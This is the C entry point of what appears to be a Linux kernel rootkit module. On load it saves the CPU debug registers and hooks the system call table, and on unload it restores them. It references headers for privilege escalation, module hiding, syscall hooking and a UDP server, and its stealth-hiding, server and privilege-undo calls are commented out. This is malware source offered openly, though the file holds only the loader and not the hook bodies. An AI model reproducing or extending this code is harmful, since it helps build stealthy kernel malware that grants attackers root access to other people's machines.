#include "utils.h"
#include "core.h"
#include "syscall_table.h"
#include "sys_escalation.h"
#include "server.h"
#include "module_hiding.h"
#include "hook.h"
#include "dr_breakpoints.h"

static unsigned long old_dr[4];
static unsigned long old_dr6, old_dr7;

/* load the LKM */
static int __init module_t_load(void)
{
  int i;
  /* do the hiding process if in STEALTH MODE */
  /* if (STEALTH_MODE) */
  /*   do_hide_module(); */

  /* start the UDP server */
  //server_start();

  for (i = 0; i < 4; i++)
	get_dr(i, &old_dr[i]);

  get_dr(6, &old_dr6);
  get_dr(7, &old_dr7);

  hook_syscall_table();
  
  return 0;
}

/* unload the LKM */
static void __exit module_t_unload(void)
{
  int i;
  /* check if "root mode" is enabled and disable it */
  if (sys_esc_flag) {
    /* reset normal permissions behavior */
    //undo_priv_esc();
  }

  for (i = 0; i < 4; i++)
	set_dr(i, old_dr[i]);

  set_dr(6, old_dr6);
  set_dr(7, old_dr7);

  debug_print("DRs restored");

  /* stop the UDP server */
  //server_stop();
  
}

module_init(module_t_load);
module_exit(module_t_unload);
